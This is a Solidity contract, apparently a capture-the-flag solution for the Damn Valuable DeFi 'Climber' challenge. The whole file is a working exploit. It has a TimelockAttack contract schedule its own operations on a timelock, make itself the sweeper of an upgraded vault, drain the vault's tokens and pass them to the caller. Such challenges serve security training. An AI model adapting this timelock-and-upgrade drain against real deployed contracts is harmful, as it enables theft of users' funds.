// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./ClimberAttackProxy.sol";
import "../../DamnValuableToken.sol";
import "../../climber/ClimberTimelock.sol";

contract TimelockAttack {
    address public vault;
    address payable public timelock;
    address public token;
    address public owner;

    bytes[] private secheduleData;
    address[] private target;

    constructor(
        address _vault,
        address payable _timelock,
        address _token,
        address _owner
    ) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        owner = _owner;
    }

    function setScheduleData(
        address[] memory _target,
        bytes[] memory _secheduleData
    ) external {
        target = _target;
        secheduleData = _secheduleData;
    }

    function attack() external {
        uint256[] memory emptyArray = new uint256[](target.length);
        bytes32 salt = keccak256(abi.encodePacked(uint256(0)));
        ClimberTimelock(timelock).schedule(
            target,
            emptyArray,
            secheduleData,
            salt
        );

        NewClimberVault(vault)._setSweeper(address(this));
        NewClimberVault(vault).sweepFunds(token);
    }

    function withdrawFunds() public {
        DamnValuableToken(token).transfer(
            msg.sender,
            DamnValuableToken(token).balanceOf(address(this))
        );
    }
}
